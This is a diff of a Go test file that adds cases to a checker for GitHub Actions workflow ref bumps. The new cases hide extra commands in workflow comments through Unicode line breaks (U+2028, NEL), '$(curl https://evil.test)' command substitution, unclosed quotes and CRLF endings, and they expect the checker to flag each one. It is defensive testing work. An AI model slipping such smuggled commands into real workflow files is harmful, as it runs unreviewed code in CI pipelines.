@@ -319,6 +319,10 @@ func TestUpload4WorkflowFile(t *testing.T) {
 		{"a ref bump with another edit", workflow4(actionBumped, " # v4.0.1", "      - run: echo hi\n"), "unknown", reasonWorkflowChanged},
 		{"a ref glued to a hash", workflow4(actionBumped+"#v4", ""), "unknown", reasonWorkflowChanged},
 		{"the workflow file removed", nil, "unknown", reasonWorkflowChanged},
+		{"a comment that hides a U+2028 line break", workflow4(actionBumped, " # v4.0.1\u2028      - run: curl https://evil.test"), "unknown", reasonWorkflowChanged},
+		{"a comment that hides a NEL line break", workflow4(actionBumped, " # v4\u0085      - run: curl https://evil.test"), "unknown", reasonWorkflowChanged},
+		{"a comment with a command substitution", workflow4(actionBumped, " # $(curl https://evil.test)"), "unknown", reasonWorkflowChanged},
+		{"a quote that does not close", workflow4(actionBumped+`"`, ""), "unknown", reasonWorkflowChanged},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
@@ -337,6 +341,30 @@ func TestUpload4WorkflowFile(t *testing.T) {
 		})
 	}
 
+	for _, tc := range []struct {
+		name, target, run, status string
+	}{
+		{"a quoted uses line bumped",
+			"      - uses: \"" + manifest.ActionRepository + "@" + actionPinned + "\"\n",
+			"      - uses: \"" + manifest.ActionRepository + "@" + actionBumped + "\" # v4.0.1\n", "pass"},
+		{"an Action reference inside a run script",
+			"      - run: echo \"" + manifest.ActionRepository + "@" + actionPinned + " # pin\"\n",
+			"      - run: echo \"" + manifest.ActionRepository + "@" + actionPinned + " # $(curl https://evil.test)\"\n", "unknown"},
+		{"a CRLF line bumped",
+			"      - uses: " + manifest.ActionRepository + "@" + actionPinned + "\r\n",
+			"      - uses: " + manifest.ActionRepository + "@" + actionBumped + "\r\n", "unknown"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			w := newWorld4(t)
+			p := w.openPull(w.shop, 7)
+			w.setFile(w.shop, testBranch, ingest.WorkflowPath, []byte("jobs:\n  check:\n    steps:\n"+tc.target))
+			s := w.spec4(p, "pass")
+			w.setFile(w.shop, s.claims.SHA, ingest.WorkflowPath, []byte("jobs:\n  check:\n    steps:\n"+tc.run))
+			if a := w.send4(s); a.Status != tc.status {
+				t.Errorf("status = %s, want %s", a.raw, tc.status)
+			}
+		})
+	}
 	t.Run("an older merge commit behind a ref bump on the default branch", func(t *testing.T) {
 		w := newWorld4(t)
 		p := w.openPull(w.shop, 7)
